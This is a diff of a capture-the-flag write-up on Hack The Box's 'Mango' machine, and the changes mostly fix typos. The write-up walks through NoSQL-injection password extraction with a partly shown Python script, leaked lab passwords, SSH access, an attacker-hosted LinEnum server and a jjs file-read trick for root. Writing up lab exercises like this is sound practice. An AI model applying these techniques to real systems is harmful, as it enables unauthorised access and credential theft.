@@ -9,31 +9,31 @@ Root: 8a8ef79a
 
 ## Hints:
 Name of the Machine - might be related to MongoDB.
-SSL certificates 
+SSL certificates
 
 
 # Take Away
 * Inspect the HTTPs website - certificates
-* Make a habbit of registering the hostnames locally.
+* Make a habit of registering the hostnames locally.
 * Look more into the home folder of the user, likely contains some hint
 
-# Recon: 
+# Recon:
 ## nmap
 scan command: `nmap -p- `
 ```
-scan results 
+scan results
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)      
 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))  
-443 
+443
 
 ```
 
 ## Web Page found:
-Https has some unknow certificate: https://10.10.10.162/
+Https has some unknown certificate: https://10.10.10.162/
 
 It talks about staging-order.mango.htb, added this as an hostname to /etc/hosts
 
-Voila, there is an webpage (which was previously not present) in the http:// and not https:// webpage. 
+Voila, there is an webpage (which was previously not present) in the http:// and not https:// webpage.
 
 http://staging-order.mango.htb/
 
@@ -42,12 +42,12 @@ Has a log in screen, might be related to Mongo DB.
 
 # Foothold :
 For the login web page, Trying to use: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
-the python script gives erronous results.
+the python script gives erroneous results.
 
-The python script from https://book.hacktricks.xyz/pentesting-web/nosql-injection Gave proper output :) 
+The python script from https://book.hacktricks.xyz/pentesting-web/nosql-injection Gave proper output :)
 
 ## Script Used:
-Notice: I guessed the name admin as the username from the certificate, and mango since the name of the machine is mango. :) - if it failes will enumerate the username as well.
+Notice: I guessed the name admin as the username from the certificate, and mango since the name of the machine is mango. :) - if it fails will enumerate the username as well.
 ```python
 import requests
 import string
@@ -101,18 +101,18 @@ for u in usernames:
 
 ```
 
-Was able to find the passwords: 
+Was able to find the passwords:
 ```
 admin : t9KcS3>!0B#2
 mango : h3mXK8RhU~f{]f5H
 ```
 
-Screen Shot of the script output.
+Screen-Shot of the script output.
 
 ![f4bc96690381ae8e708dfd9567e1a274.png](../../_resources/75f312370d134f34bd6500062a08d5f5.png)
 
 
-Logging into the website gave: 
+Logging into the website gave:
 
 ![38e6dd193b053e4ddcbe00572afa2b08.png](../../_resources/e593df41839d40feb9c2276e464bc6ef.png)
 
@@ -120,12 +120,12 @@ Logging into the website gave:
 
 SSH into the box with the previous passwords:
 admin - fails
-mango - works :) 
+mango - works :)
 
 ```
 su admin
 cat /home/admin/user.txt
-79bf31c6c6eb38a8567832f7f8b47e92
+79bf31c6c6
 ```
 
 # Priv Esc:
@@ -134,14 +134,14 @@ su admin
 password is the one found above.
 
 
-# Root: 
+# Root:
 
-Checked a bunch of stuffs did not help corntab looks to be running. Might come back to this latter. 
+Checked a bunch of stuffs did not help corntab looks to be running. Might come back to this latter.
 
 Will try to run the LinuxEnum Script.
 
 ```
-Attacket Machine:
+Attacker Machine:
 cd /root/HTB/LOCAL/LinEnum
 python -m SimpleHTTPServer 8080
 
@@ -182,7 +182,7 @@ looked more into the home folder of the user.
 
 ```
 ls -la /home/admin
-found a file for jjs history; found this code snippnet.. 
+found a file for jjs history; found this code snippet..
 
 var BufferedReader = Java.type("java.io.BufferedReader");
 var FileReader = Java.type("java.io.FileReader");
@@ -191,5 +191,5 @@ while ((line = br.readLine()) != null) { print(line); }
 
 ```
 
-Works :) 
+Works :)
 Owned the Root.
